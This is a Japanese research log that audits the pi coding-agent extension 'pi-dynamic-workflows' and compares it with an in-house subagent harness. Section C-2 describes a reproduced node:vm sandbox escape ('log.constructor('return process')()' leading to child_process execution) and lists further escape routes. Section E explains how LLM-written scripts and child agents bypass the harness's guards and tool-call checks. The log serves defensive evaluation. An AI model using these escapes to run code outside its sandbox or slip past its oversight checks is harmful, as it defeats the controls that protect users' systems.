# pi-dynamic-workflows の深掘り（自作の並列・協調実行と比べて、上回れるか）

<!-- 現在の運用の正本は docs/spec/guard/pi-subagents.md。ここは「いつ何を調べ・測ったか」を積む場所 -->

## 記録 W1 — 2026-11-05

- **問い**: 公開拡張 `pi-dynamic-workflows`（同名が 2 つある）の実装を、README でなくソースと issue/PR まで読み、
  自作の並列・協調実行（`guarded_task`・`/fleet`・`feature-orchestration`・`scripts/bundle.py`）を**上回れるか**。
  上回れないなら、公開実装を検査して vendor する方が良いか
- **対象の版**: (A) `@quintinshaw/pi-dynamic-workflows` **3.15.0**（npm の tarball と GitHub の `af8c0ed`・タグ `v3.15.0` が一致）。
  (B) `pi-dynamic-workflows` **1.0.1**（作者 miclivs。GitHub `Michaelliv/pi-dynamic-workflows` の `main`）。
  pi 本体は 1.4.0（入れている版）
- **環境**: Linux（WSL）、Node 24.5.0。取得は `npm` レジストリの tarball・`git clone`・`gh issue/pr`（読み取りだけ）
- **例外の開示（ADR-0016 との関係）**: 公開拡張は「導入・実行しない」が原則（[ADR-0016](../../adr/0016-pi-extensions-own-first.md)）。
  今回は**サンドボックスの抜けを実証するため**、作業ツリー内の使い捨て領域（`.tmp/research/pi-dynamic-workflows/`）で
  `npm ci --ignore-scripts`（ライフサイクルスクリプトは実行しない。`package.json` に install 系のスクリプトも無い）をし、
  (A) の `runWorkflow()` を**スタブの agent で 1 回**呼んだ（実モデル・実ネットワークは使っていない。実行したコマンドは `echo` だけ）。
  pi への導入・配備はしていない
- **原文の保存**: `.tmp/research/pi-dynamic-workflows/sources/`（tarball の展開 `package/`、clone の `repoA`・`repoB`、issue・PR の一覧 JSON、
  再現用の `poc/`）。`.tmp/` は git に入らない（本記録からの参照は手元の写しを指す）。引用は MIT ライセンス
  （(A) Copyright (c) 2026 QuintinShaw。(B) も MIT と `package.json` に記載）のもとで、1 か所 15 行前後に抑えた
- **限界**: README と同梱の docs の主張は「主張」と書き、コードで確かめたものだけ「確認」と書いた。実モデルでの run・TUI の操作・
  Windows での挙動・自作拡張を children に載せる改造は**動かしていない（未確認）**。工数の見積もりは**推測**

### 結論

1. **規模**: (A) は `src` 26.0k 行（TypeScript 55 ファイル）・試験 47.4k 行（66 ファイル）・235 commit（2026-05-28〜、直近 90 日で 84）。
   実行時依存は `acorn` 1 つ。(B) は 4 ファイル 455 行・16 commit で、**2026-05-31 以降止まっている**（試作）。
   ※ 依頼文の「2.8MB」は tarball 全体の大きさで、`dist` と `src` の二重に加えて README・skills・画像を含む
2. **(A) の強み 3 つ**: (a) **決定的な再開**（`workflow.ts:1140-1217` の呼び出しごとのハッシュと journal。`prefix` / `replay-completed` の 2 方式、
   予算も再開をまたいで累積）。(b) **トークン予算と phase ごとの予算、`maxAgents` の同期予約**（`workflow.ts:1239`・`ensureAgentCapacity`）。
   (c) **失敗時の後始末の細かさ**（abort の drain・runFatal の封印・使用量の確定。issue 100 件超を潰した跡）
3. **(A) の弱点 3 つ**: (a) **`vm` は境界でない。実証した**: スクリプトから `log.constructor('return process')()` で**ホストの `process` に出られ、
   `child_process` で任意のコマンドを実行できた**（`poc/escape.mts`、(A) 3.15.0 の `runWorkflow()` で再現。作者自身も
   `workflow.ts:640-643`・`workflow-capability-contract.ts:610` で「境界でない」と明記）。(b) **子は同じプロセス内のセッションで、拡張を読まない
   （`agent.ts:992` の `noExtensions: true`）。既定の道具は素の `bash`・`edit`・`write`**（`agent.ts:864`）。自作のフルガードは子に**効かない**
   （推測ではなくコードから。`excludeSubagentTools` と `providerMiddlewareExtensions` で塞ぐ口はあるが、ガードを子へ載せる経路は未検証）。
   (c) **既定は予算なし**（`config.ts:23` `DEFAULT_TOKEN_BUDGET = null`）で、予算は**トークンの柔らかい門**（実行中の子は超えうる）。
   金額の上限は無く、worktree は**既定で残り続け回収されない**（`workflow.ts:1565`・`worktree.ts`・`pi/wf/` の掃除は src に無い）
4. **自作で上回れるか**: **上回れる領域が大きいが、「同等」にすべき領域が 2 つある**。上回れる: 子ごとのフルガード（別プロセス・拡張を載せる）、
   worktree の寿命管理、予算の**予約方式**（起動前に確保）、親が idle のまま通知で起きる運用。同等にすべき: **決定的な再開**（今は無い）と
   **予算の上限**（今は時間だけ）。**不要**: JS の DSL・1000 件の fan-out・キーワードの自動起動
5. **サンドボックスと権限**: (A) をそのまま入れると、**LLM が書いた JS が親プロセスの全権で動き（フルガードの外）、子も素のシェルを持つ**。
   OS 層の隔離（`pis`）は残るが、拡張層のガードは回避される。**そのままの導入は不可**。vendor するなら、`vm` の置き換え（別プロセス・
   `node:vm` を捨てる）と子のガード化の改造が前提で、その費用は自作の MVP と同程度以上（下の H）。**結論: 自作を伸ばす。vendor は採らない**
6. **並列度を上げる最大の借用 3 点**（J。コードでなく**仕様を借りる**）: (a) **「列挙・順序・重複排除・上限・停止・失敗の台帳は決定的なコードが持ち、LLM は意味の仕事だけ」という境界**
   （`pattern-selection.md`）を、JS でなく**宣言的な台帳**で再現する。(b) **中間結果を親の文脈に入れず、実行側のメモリ・ファイルに置いて親へは最終の要約だけ返す**
   データフロー（親の待ちと文脈が上限を決めている）。(c) **`maxAgents` の同期予約・fan-out 単位の cancel・429 を「回復不能な一時停止」として分け、journal から自動再開する**制御（再試行の嵐を避ける）

### A 規模と体制

| 項目 | (A) `@quintinshaw/pi-dynamic-workflows` 3.15.0 | (B) `pi-dynamic-workflows` 1.0.1 |
| --- | --- | --- |
| リポジトリ | `QuintinShaw/pi-dynamic-workflows`（(B) の fork 系。`contributors` に michaelliv を original author と記載） | `Michaelliv/pi-dynamic-workflows` |
| ライセンス | MIT | MIT |
| `src` | 55 ファイル・25,976 行（`wc -l`） | 5 ファイル・約 450 行（`src/workflow.ts` 455・`agent.ts` 131・`display.ts` 235・`workflow-tool.ts` 209・`structured-output.ts` 47・`index.ts` 30） |
| 最大のファイル | `workflow.ts` 2,912・`workflow-manager.ts` 2,487・`workflow-ui.ts` 2,347・`task-panel.ts` 1,785・`agent.ts` 1,721・`workflow-comprehension.ts` 1,673 | `workflow.ts` 455 |
| 試験 | `tests/` 66 ファイル・47,373 行。CI は `ci.yml`（Node 22・`npm test` = biome + tsc + release check + 単体）と、pi 1.x へ再解決する `test-pi-1` ジョブ | 4 ファイル・約 410 行 |
| 実行時の依存 | `acorn ^8.16.0` の 1 つ（再帰でも他に無い。`acorn` は依存ゼロ）。peer: pi-coding-agent / pi-tui / typebox | `acorn` 1 つ。peer: pi 0.78 系 |
| install スクリプト | 無し（`prepublishOnly` のみ） | 無し |
| commit | 235（初回 2026-05-28・最新 2026-10-28）。月別: 5 月 36・6 月 37・7 月 75・8 月 28・9 月 44・10 月 15。**直近 90 日で 84** | 16（2026-05-28〜**05-31 で停止**） |
| 貢献者 | 35 人。`QuintinShaw` 152（65%）・`Arietids` 22・`Michael Livshits` 9・`Will Hampson` 9。直近 90 日は QuintinShaw 40・Arietids 22・他 | 4 人（Michael Livshits 10・Michael 4・他 2） |
| バス係数 | **1**（1 人が 65%、上位 2 人で 74%。直近 90 日も 2 人で大半） | 1（しかも停止） |
| issue・PR | issue 全期間で open 4（#165・#231・#235・#240）。PR 184 件（マージ 154・close 27・open 3） | issue 28（open 12。基本は設計メモ）。PR 16（open 3・**セキュリティ PR #18 は未マージで close**） |

- (A) は (B) の機能（`agent`・`parallel`・`pipeline`・`phase`）を**そのまま引き継いだうえで 57 倍に育てた**もの。(B) には journal・再開・worktree・
  予算の実装が無い（`isolation` は文字列をプロンプトに足すだけ。`src/workflow.ts:424,448`）。(B) の `vm` は同じ使い方（`workflow.ts:186,215`）
- (B) への PR #18（`aaronjmars`、2026-05-30）が**同じ `vm` の抜けの 4 つの経路を指摘し、修正を出していた**:
  `log.constructor.constructor`・async 関数の prototype・`new Function`/`eval`・`budget.spent.constructor`。**メンテナーは応答せず、
  3.5 週の bump の後に close**。(A) は後継だが、橋渡しの関数がホストの `Function` を持つ構造は残っている（下の C-2）

### B アーキテクチャ（(A)）

| 項目 | 内容（ファイル:行） |
| --- | --- |
| 入口 | `package.json` の `pi.extensions: ["extensions/workflow.ts"]` → `src/pi-extension.ts`（409 行）。skills 2 件（`workflow-authoring`・`workflow-patterns`） |
| 使う pi の API | `registerTool`（`workflow`・`workflow_control`。`exposure:"deferred"` で system prompt から外す。`pi-extension.ts:185-186`）、`registerCommand`（`workflows`・`workflows-trigger`・`workflows-models`・`effort`・`ultracode`・`deep-research`・`adversarial-review`・`code-review`・`multi-perspective`・`codebase-audit`・保存済み workflow の名前）、`pi.on`（`session_start`・`session_shutdown`・`model_select`・`input`・`before_agent_start`・`turn_end`）、`ctx.ui.setWidget`・`ctx.ui.custom`、`pi.setActiveTools`、`pi.sendMessage`（結果の配送） |
| `workflow` ツールの引数 | `workflow-tool.ts:73-150` の typebox: `script?`・`name?`（保存済み・組み込み）・`args?`（object）・`background?`（既定 true）・`maxAgents?`（既定 1000）・`concurrency?`・`agentRetries?`・`agentTimeoutMs?`・`tokenBudget?`・`resumeFromRunId?`・`resumeMode?`（`prefix` \| `replay-completed`） |
| DSL（スクリプトの globals） | `agent(prompt, opts)`・`parallel(thunks)`・`pipeline(items, ...stages)`・`phase(title, {budget})`・`workflow(name, args)`（入れ子は 1 段）・`verify`・`judgePanel`・`loopUntilDry`・`completenessCheck`・`retry`・`gate`・`checkpoint`・`log`・`args`・`cwd`・`process.cwd()`・`budget`（`workflow.ts:2160-2184`）。1 行目に `export const meta = {...}`（`acorn` の AST で**リテラルだけ**を読む。`workflow.ts:2517-2640`） |
| `agent()` の主なオプション | `label`・`phase`・`schema`（JSON Schema。`type:"object"` 必須）・`model`・`tier`・`thinking`・`agentType`・`isolation:"worktree"`・`keepWorktree`・`cwd`・`thread`・`timeoutMs`・`retries`（`workflow-capability-contract.ts:174-`） |
| 子の生成 | `agent.ts:1385-1450`: `createAgentSession({ cwd, sessionManager, settingsManager, customTools, resourceLoader, modelRuntime, excludeTools, ... })`。**同じ Node プロセス内のセッション**。`customTools` = `createCodingTools(cwd)`（`agent.ts:864,1207`）+ agentType の allow/deny + 共有ストアのツール + `structured_output`。`resourceLoader` は **`noExtensions: true`**（`agent.ts:992`）で、`providerMiddlewareExtensions`（既定 `[]`。`agent.ts:269`）で名指ししたものだけ読む。再帰防止で `workflow`・`workflow_control` を常に除外（`agent.ts:783`。#107 の修正） |
| UI | `/workflows`（`workflow-ui.ts` 2,347 行 + `task-panel.ts` 1,785 行の TUI。一覧・詳細・pause/resume/kill・検索・名前変更）、進捗 widget（`display.ts`）、`/effort`・キーワード arming |
| 設定 | `~/.pi/workflows/settings.json`（全体）→ **リポジトリ内** `<cwd>/.pi/workflows/settings.json` → 利用者の project 別。後勝ちの merge（`workflow-settings.ts:112-130`）。キー: `keywordTriggerEnabled`/`Word`・`defaultEffort`・`defaultAgentTimeoutMs`・`defaultTokenBudget`・`defaultConcurrency`・`defaultAgentRetries`・`persistAgentSessions`・`inheritMainModel`・`excludeSubagentTools`・`providerMiddlewareExtensions` ほか。モデル階層は `~/.pi/workflows/model-tiers.json`（small/medium/big） |

### C アルゴリズム（(A)）

**C-1 DSL の実行モデル**: スクリプト全体を `(async () => { <body> })()` で包み、`vm.Script(...).runInContext(context)` で 1 回走らせる
（`workflow.ts:2195-2202`）。`agent()` は呼ぶたびに `callIndex = state.callSeq++`（字句順の通番）と `callHash` を割り当て
（`workflow.ts:1146`）、`limiter`（同時数の門）を通して子を走らせる。`parallel(thunks)` は関数の配列を受け、1 件が投げても他を止めず、
その結果は `null`（コメント `workflow.ts:~2630` の「parallel() の契約」）。`pipeline` は項目ごとに段を順に、項目間は並行。

**C-2 `vm` の使い方と限界（確認。実証あり）**:

- 文脈は `vm.createContext({ ...projectGlobals })`（`workflow.ts:2187`）。`projectGlobals`（`agent`・`log`・`budget` など）は**ホスト側の関数**。
  作者のコメント（MIT。`workflow.ts:636-643`）:

  ```text
  Runtime determinism hardening, run inside the vm realm BEFORE the user script. ...
   * Using the vm realm's own Math/Date/Reflect (not host objects) means this adds
   * no host-`Function` escape. Note: vm is not a security sandbox — an injected
   * bridge function's `.constructor` is still the host Function, so a determined
   * script could bypass this. The guard is best-effort against ACCIDENTAL
   * nondeterminism from trusted (user / guided-LLM) scripts, not a security wall.
  ```

- つまり `Date.now`・`Math.random` の遮断は**非決定性を事故で入れないための補助で、セキュリティ境界ではない**。`workflow-capability-contract.ts:610` にも
  `"VM is not a security sandbox"`。パース時の遮断は正規表現 `/\bDate\s*\.\s*now\b|.../`（`workflow.ts:629`）と事前の AST 検査だけ
- **再現（2026-11-05、実行した）**: `poc/escape.mts`（本記録の末尾に全文）を `npx tsx` で、(A) 3.15.0 の `runWorkflow()` に対して実行:

  ```text
  $ npx tsx ../../poc/escape.mts
  {"out":"ESCAPED-FROM-VM","a":"stub","hostPid":3270916}
  ```

  スクリプトは `log.constructor('return process')()` でホストの `process` を得て、`process.getBuiltinModule('node:child_process').execSync('echo ...')` を実行できた
  （`echo` だけ。`hostPid` は親プロセスの値）。`Date`・`Math` の遮断・meta の AST 検査・禁止語の検査は、この経路に**何も効かなかった**
- (A) の試験にも「`({}).constructor.constructor` は vm の `Function` で、遮断された `Date.now` に当たる」（`tests/workflow-runtime.test.ts:4114`）はあるが、
  **ホストの橋渡し関数の `.constructor` を使う経路の試験は見当たらない**（grep の範囲。未確認）

**C-3 スケジューラ**: 同時数 `MAX_CONCURRENCY = 16`（`config.ts:12`。`concurrency` 引数は 1〜16 に丸める。既定は `hardwareConcurrency - 2`）。
合計 `MAX_AGENTS_PER_RUN = 1000`（`config.ts:6`）。実装は FIFO の待ち行列だけの `createLimiter`（`workflow.ts:2641-2656`）:

```ts
function createLimiter(limit: number) {
  let active = 0;
  const queue: Array<() => void> = [];
  const next = () => { active--; queue.shift()?.(); };
  return async <T>(fn: () => Promise<T>): Promise<T> => {
    if (active >= limit) await new Promise<void>((resolve) => queue.push(resolve));
    active++;
    try { return await fn(); } finally { next(); }
  };
}
```

- 待機者を起こす `next()` と `active++` の間に隙がある（`active--` の後に別の呼び出しが門を通れる）ため、**理論上は上限を一時的に超えうる**（推測）。
  複製した関数に定期的な割り込みを入れた試験（`poc/limiter.mjs`、563 件）では `peak == limit`（4）で**再現しなかった**。「欠陥」とは言えない
- 優先度・公平性・背圧は無い。`maxAgents` の枠は `agent()` の呼び出し時に**同期で予約**し（`workflow.ts:1163`）、`parallel` の一括投入で超えた分は
  「batch の cancelled」を立てて待機中の子を起動前に捨てる（`workflow.ts:1230-1238, 1575-`）。**予約は枠（件数）であってトークンではない**
- 失敗の伝播: 回復可能な失敗は `agent()` が **`null` を返す**（`workflow.ts:1550`。ログに残る）。回復不能は投げ、トップレベルで逃げたものは
  `runFatalController.abort()` で**同じ run の兄弟を abort**（`workflow.ts:~2290`）。provider の上限到達も同じ扱いで、兄弟の途中の仕事は
  捨てる（コメントに明記）。外部の abort は `drainAbortGraceMs`（既定 10 秒）で子の後始末を待つ

**C-4 journal と再開**: 呼び出しの身元 = `sha256(JSON.stringify({prompt, model, tier, thinking, phase, agentType, agentDef, schema, cwd, isolation, keepWorktree}))`
（`workflow.ts:2770-2793`）。journal の 1 件は `{ index, runId, hash, result, storeDelta?, model? }`（`run-persistence.ts:58-67`）。
`resumeFromRunId` で同じ（または編集した）スクリプトを再実行すると、`callIndex` が同じで `hash` も同じ呼び出しは**子を起動せずに結果を返す**
（`workflow.ts:1176-1208`）。

- `prefix`（既定）: 最初の不一致（編集・欠落）以降は全部やり直す。`replay-completed`（#246 で追加）: 同じ fan-out の完了済みの兄弟は、欠落をまたいでも再利用
- 予算は再開で**リセットされない**（`initialTokenUsage` を種にする。`workflow.ts:859-`）。`maxAgents` は再生で件数を再構築
- **限界（コードから）**: (1) 再利用されるのは**テキストの結果だけ**。子が行った**ファイルの編集やコマンドの副作用は再生されず、ハッシュにも
  リポジトリの状態は入らない**。同じ prompt でも、再開時に作業ツリーが変わっていれば古い結果が返る。(2) `thread` つきの呼び出しは journal の対象外
  （`workflow.ts:1176`）。(3) 作者自身が「共有ストアやファイル経由の値は hash されない」と注意書き（#231 のコメント）。(4) スクリプトが決定的でなければ
  `callIndex` がずれる。そのため `Date.now`・`Math.random` を遮断した（これが「決定的な再実行の前提」）。この遮断が**境界でない**ので、前提は破れる
- 保存先: `~/.pi/workflows/` 下の run ファイル（`run-persistence.ts`・`run-record-store.ts`。排他の `.lock`・`.tmp`・`.bak` を使う。#225 で書き込みの
  O(n²) を直した）

**C-5 モデル階層の解決**: 優先順位は `agentOptions.model` > `agentType.model` > `tier` > phase の `model` > 主モデルの継承 / 暗黙の `medium` 階層
（`workflow.ts:1130-1138`・`agent.ts:resolveAgentModelSpec`）。`preSpawn` の解決フックは `globalThis[Symbol.for("@quintinshaw/pi-dynamic-workflows.preSpawnModelResolver")]`
（`README.md:409`。プロセス全体で 1 つ、後勝ち、`use` で別モデルへ差し替え可）。**同じプロセスの他の拡張が、子のモデルを黙って差し替えられる**
（信頼の前提。実害は未確認）。

**C-6 費用の集計と予算**: 子ごとに `usageTracker` が試行ごとの使用量（input/output/cache/cost/total）を集計し、`shared.tokenUsage` と `shared.spent` に足す
（`workflow.ts:1257-1264`）。**門は `budget.total`（トークン）のみ**: 新しい子の**起動前**に `budget.remaining() <= 0` なら `TOKEN_BUDGET_EXHAUSTED` を投げる
（`workflow.ts:1239`）。コメント（`workflow.ts:1166-1170`）: "Token budget stays a soft gate: spent accrues after each agent ... in-flight agents may push slightly past total"。
phase ごとの柔らかい小予算あり（80% で警告、100% で投げる）。**既定は無制限**（`DEFAULT_TOKEN_BUDGET = null`・設定 `defaultTokenBudget` で足せる）。
**金額（`cost`）の上限は無い**（集計して表示するだけ）。#209 は「使用量が取れないとき合計を捏造して実測として保存」していた不具合（修正済み）。

**C-7 自動起動のキーワード判定**: `workflow-editor.ts:27-36` の正規表現。語の境界（`/`・識別子の文字・`$`・`-` が隣に無い）で、既定の語 `workflow` は複数形 `workflows` も許す。
一致すると**そのターンだけ** system prompt に「workflows mode armed」の指示を足す（`before_agent_start`、`input` で判定）。**ツールの利用を許可するだけで強制しない**
（モデルが質問や雑談なら直接答える。`buildArmedWorkflowDirective`、`workflow-editor.ts:100-`）。常時の門は `WORKFLOW_GATE_GUIDELINE`（`workflow-tool.ts:25`）。
**既定は ON**（`keywordTriggerEnabled`）。履歴に過剰起動の不具合が多い: #7・#15（無効化の要望）・#88（単語に触れただけで起動）・#89（挙動がおかしい）・
 issue 245（print/json モードで起動しユーザー文に書き込む）・#257（system prompt を返すため後続の thinking が捨てられる）。
`/effort`（`high`/`ultra`）は**全ての実質的な発話で arming**する（常時モード）。

**C-8 `verify` / `judgePanel` / `loopUntilDry`**（`workflow.ts:1849-1968`）:

| 関数 | 意味 | 停止条件・弱点 |
| --- | --- | --- |
| `verify(item, {reviewers=2, threshold=0.5, lens})` | N 人の子に「反証を試みよ。不確かなら `real=false`」と頼み、`real` の割合が閾値以上なら真 | 子の結果が全部 `null` だと `real:false`（票ゼロ）。**検証する子も素の道具を持つ**。`item` はそのままプロンプトへ連結（未信頼の内容の注入の経路） |
| `judgePanel(attempts, {judges=3, rubric})` | 候補ごとに N 人が 0〜1 で採点し、平均が最高のものを返す（同点は入力順） | `maxAgents` の枠を `候補数 × judges` で事前確認。採点の再現性・順序の偏りへの対策は無い |
| `loopUntilDry({round, key, consecutiveEmpty=2, maxRounds=50})` | 新規が 2 回連続で空になるまで round を繰り返す | `TOKEN_BUDGET_EXHAUSTED`・`AGENT_LIMIT_EXCEEDED` を**黙って握りつぶして途中結果を返す**（`workflow.ts:1949-1952`）。呼び出し側は「枯れた」か「予算切れ」か区別できない。#161 は `judgePanel` の枠の数え間違い |

**C-9 worktree の隔離**: `isolation:"worktree"` の子ごとに `git worktree add -b pi/wf/<slug>-<uuid> <repo>/.pi/worktrees/<slug>-<uuid> HEAD`（`worktree.ts:58-80`）。
失敗したら**共有のチェックアウトへ落とさず**止める（fail-closed。`workflow.ts:1284`）。`git` 呼び出しは 30 秒のタイムアウト。**回収**: `keepWorktree:false` のときだけ
子の終了時に `git worktree remove --force` + `branch -D`（`workflow.ts:1565`）。**既定は残す（「merge のために」。結果は自動で merge されない）**。
`pi/wf/` を掃除するコードは `src` に**無い**（grep）。プロセスが落ちると、`keepWorktree:false` でも残る。`git worktree lock` は使っていない（自作は `pi-agent <jobId>` で lock。
`worktree.ts:786`）。`.pi/worktrees/` は**リポジトリの作業ツリー内**なので、`.gitignore` が無ければ未追跡の山になる（推測。(A) 側に追加する処理は未確認）。

**C-10 キャンセル**: `options.signal`（Esc・pause・stop）と `runFatalController` を、子ごとの `AbortController` に連結。子の abort はセッションの dispose と使用量の確定を伴う（#109 の
メモリ対策）。**子のシェルのプロセスグループを殺す処理は見当たらない**（子はプロセス内のセッションで、`bash` の子プロセスの扱いはセッション側。未確認）。

**C-11 保存済み workflow**: `~/.pi/workflows/saved/`（全体）と `<repo>/.pi/workflows/saved/`（リポジトリ）の `.js`。名前は組み込みの slash コマンドとの衝突を検査（#256）。
**リポジトリ側に置いた JS は、利用者が実行すると（上の `vm` の抜けにより）親プロセスの権限で動く**（`<repo>/.pi/agents/*.md` の agentType が `tools`・`model` を束縛できる
（`config.ts:AGENTS_DIR`）。いずれも信頼できないリポジトリを開く場合の話。推測）。

**C-12 `/deep-research`**（`deep-research.ts:20-120`。4 つの phase の**固定スクリプト**。プロンプトの要点）:

1. `Queries`: 「この問いのために `angles`（既定 4）個の多様で具体的な検索クエリを作れ」（schema: `{queries:string[]}`）。`null` ならそのまま問いを 1 クエリとして続行（#86 の修正）
2. `Gather`: クエリごとに 1 人 `parallel`。「`web_search` → 上位 2 件を `web_fetch` → **取ったページに書いてあることだけ**を、出典 URL つきの主張として抜き出せ。出典や主張を捏造するな」
3. `Verify`: 1 人が全出典を横断して、**`minSupport`（既定 2）以上の独立した出典、または明確に権威ある 1 出典**で支えられる主張だけ残す
4. `Report`: 「支えられた主張だけで、出典の URL をインラインで引いた簡潔な報告を書け。証拠が薄ければ薄いと書け」

`web_search` は Bing の HTML のスクレイピング（`web-tools.ts:106`）、`web_fetch` は URL をそのまま `fetch`（`redirect:"follow"`、本文 2MB 上限）。
**宛先の検査（内部アドレス・ポート・認証つき URL の拒否）は無い**（自作の `web-search` の `fetch` は拒否する。SSRF の経路になりうる。推測ではなく、コードに検査が無いことを確認）。

### D 品質

- **試験**: `tests/` 66 ファイル・47,373 行（`src` の 1.8 倍）。単体（`tsx --test`）+ 性質試験（`fast-check`）+ 「リリース関門」（`workflow-release-gate.ts`・
  `check-workflow-release.ts`: docs の生成物・prompt の大きさ・skill の版の整合を `release:check` で検査）。CI は 2 ジョブ（lockfile の pi 0.85 と、pi 1.x へ再解決）。
  **実モデルでの試験は CI に無い**（`workflow-comprehension.test.ts` は注入したモデルの応答）。サンドボックスの抜けの試験は上のとおり不足
- **エラー処理**: `WorkflowErrorCode` の列挙（`errors.ts`）で回復可否を分類。drain・grace・使用量の確定・lock の token 化など、**後始末の記述は非常に細かい**
- **open の issue（全 4 件）**: #165 per-agent の使用量をスクリプトへ出す要望／#231 子の失敗が `AGENT_EMPTY_OUTPUT` に潰れる・最終報告が永続しない・再開が完了済みを再起動（部分的に 3.14.0 で対応、報告の取得は open）／
  #235 背景の結果の配送が次の利用者のメッセージまで `pending`（pi 0.87）／#240 エージェント間共有のネットワークの提案
- **closed の主な主題（issue 全 80 件ほどから 40 件を主題別に）**:
  - 過剰起動・設定: #7・#15・#31・#88・#89・#245・#257（キーワードの arming の不具合が最多の群）
  - 予算・上限: #14・#26（トークン切れの処理）・#68（既定の予算）・#146（`maxAgents` 超過で完了済みの分が無駄になる）・#161（`judgePanel` の枠の数え間違い）
  - 配送（背景の結果が届かない）: #142・#147（別セッションに配送され消える）・#185・#186・#175（二重配送）・#235 が open
  - 再開・永続: #206（resume が記録を空にする）・#207（再起動で上限の回数が戻る）・#208（共有ストアの削除が兄弟の書き込みを消す）・#209・#225（O(n²) 書き込み）・#226（起動で全履歴を同期 parse）・#171（abort 後に `running` のまま残る）
  - 安全・再帰: **#107（子が `workflow` を再帰起動して `maxAgents` を迂回）**・#24（子を別プロセスで隔離したい → 「in-memory セッションは高スループットのための**設計**。プロセス隔離はオーバーヘッドが大きい」と close）・#132（MCP や拡張のツールを子へ渡せるか）・#244（組み込み拡張の許可）
  - 資源: #109（3〜4 run で OOM）・#5・#72・#110（TUI のクラッシュ）
  - モデル: #36・#38・#60・#131・#148・#166・#202・#203（モデルの解決・表示のずれが多い）
- **PR の傾向**: 154 件マージ。`QuintinShaw` が 80 件、`ArietidsZ` 22 件。ほぼ全てが**不具合の修正と機能の追加の連続**（月 15〜75 commit）。open 3 件（#262・#263・#264）。
  (B) のセキュリティ PR は放置され close（上）。(A) の中に `vm` の抜けを直す PR は**見つからなかった**（`gh pr list` 184 件の題名の範囲。本文までは未確認）
- **コードから見えた欠陥・リスク**（根拠つき）:
  1. **`vm` の抜け**（C-2。実証）
  2. **費用の暴走**: 既定で予算が無制限・金額の上限が無い・キーワード arming が既定 ON・`/effort` が常時（C-6・C-7）。`maxAgents` 1000 × 各子のフルコンテキスト
  3. **`agent()` の回復可能な失敗が `null`**: スクリプトの検査を忘れると、失敗が「結果なし」として黙って流れる（`workflow.ts:1550`）。`loopUntilDry` も予算切れを黙って返す
  4. **再実行の非決定性**: 副作用とリポジトリの状態が journal に入らない（C-4）。`thread` は対象外
  5. **残骸**: worktree と `pi/wf/*` の枝が既定で残り、掃除が無い（C-9）。`.lock`・`.bak`・`.tmp` の run ファイルも（`fs-persistence.ts`）
  6. **配送の脆さ**: 背景の結果を「親のセッションへ戻す」仕組みで不具合が 6 件以上（上）。open の #235 が現行。自作は子の完了通知で親が起きる別の仕組み

### E 権限と安全

- **子のツール**: 既定で `createCodingTools(cwd)`（read・bash・edit・write など）。agentType の `tools`／`disallowedTools` と、設定 `excludeSubagentTools` で絞る。
  **書き込み範囲の制限は無い**（`cwd` はセッションの作業ディレクトリの指定にすぎない。`isolation:"worktree"` でも、子は絶対パスで他を書ける。コード上は制限なし。実機での確認は未実施）。
  **シェルは素の `bash`**。通信は `web_fetch`（上記）と `bash`（`curl` 等）で、どちらも制限なし。テレメトリは `src` に見当たらない（`telemetry|analytics|sentry|posthog` で grep して 0 件）
- **フルガード下で動かしたときの穴**（コードからの推論。実機では動かしていない）:
  1. **`workflow` ツールの呼び出しはガードを通る**が、見えるのは**スクリプト文字列だけ**。内容の安全性は判定できない
  2. **スクリプトは `vm` の抜けでホストの `process` を得られる**。これは**ツール呼び出しではない**ので、ハーネスの `tool_call` の判定を通らない。拡張層のガードは完全に迂回される。
     残るのは OS 層の隔離（`pis` の sandbox）だけ
  3. **子は `noExtensions: true` で作られ、ハーネスを読まない**。子の `bash`・`write` は**ガードを通らず、確認もされない**（pi 本体に承認機能は無い。[pi-isolation-options](pi-isolation-options.md)）。
     自作の「全ての子がフルガード下」の逆
  4. **口はある**: `providerMiddlewareExtensions` に拡張を名指しすると子へ読み込める。ただし (a) 名前の照合は `isProviderMiddlewareExtensionPath`（未読）、(b) 同じプロセス内なので
     ガードの状態（承認の保留・UI）の共有が必要、(c) **子に素の `bash` が残る**ので、`excludeSubagentTools` で全て除外する必要がある。**成立するかは未検証**
  5. **設定の信頼**: `<repo>/.pi/workflows/settings.json` が全体の設定より優先して読まれる（`workflow-settings.ts:123-130`）。`providerMiddlewareExtensions`・`excludeSubagentTools`・
     `defaultTokenBudget`（`null` で無制限）を**リポジトリが指定できる**。信頼できないリポジトリを開くと、予算を外される・拡張を読まれる（推測。(A) 側の信頼確認は見当たらない）
- **自動起動による費用の暴走**: キーワード（`workflow`）を発話に含めるだけで arming され、モデルが並列実行を判断しうる。予算は既定なし。**1 発話が
  最大 1000 子 × フルコンテキストの費用になりうる**（`maxAgents` を LLM が下げなければ）。ツールの説明は「利用者の明示的な同意がある場合だけ」と書くが、強制はモデルの判断に頼る

### F 機能比較表

「今の pi」の根拠: `home/dot_config/pi/harness/children.ts`（581 行）・`index.ts`（2,017 行）・`worktree.ts`（1,280 行）・`model-choice.ts`・`docs/spec/guard/pi-subagents.md`・
`common.toml.tmpl` の `[pi.commands.fleet]`（`/fleet`）・`scripts/bundle.py`（338 行）・`.agents/skills/feature-orchestration/`。判断: ◎同等必須・○取り入れる・△上回る設計・×不要。
**検証の列は設計案で、今回は実行していない**（実行したのは C-2 と C-3 の 2 件だけ）。

| 機能 | 公開実装の仕様（出典） | 今の pi（出典） | 判断 | 上回る設計の案 | 上回ったと言える検証 |
| --- | --- | --- | --- | --- | --- |
| 並列実行の数 | 同時 16・合計 1000。FIFO の門（`workflow.ts:2641`、`config.ts:6,12`） | 同時の生存 6（`index.ts:936` `MAX_JOBS`）、1 回の `tasks` は 12 件（`children.ts:55`）。空くまで待つ（`index.ts:1669`） | × | 件数を増やさない。**実効の並列は 3〜5 が最適**（O2 の調査）で、規模ではなく制御を競う | 6 を超える起動が拒否される試験（既存）。1000 件の需要が実測で出るまで増やさない |
| 子の隔離・ガード | 同一プロセスのセッション。`noExtensions:true`・素の `bash`（`agent.ts:992,864`）。作者はプロセス隔離を「設計として不採用」と回答（#24） | **子ごとに別プロセス**（`pi --mode rpc --no-approve -ne -e builtin:mcp -e <ハーネス>`、`index.ts:1277`）。判定・確認・伏字化が子にも効く。子の承認待ちは `blocked` で親へ | △（**既に上回る**） | 現状維持。子の許可リスト（`bypass-worker` など）を、役割ごとの書き込み範囲まで広げる | 障害の注入: 子に禁止操作（担当外への `write`）をさせ、**子の判定器が拒否**し親へ `blocked` が返ること。公開実装の同じ操作が素通りすること（(A) では実機で未確認。コード上は素通り） |
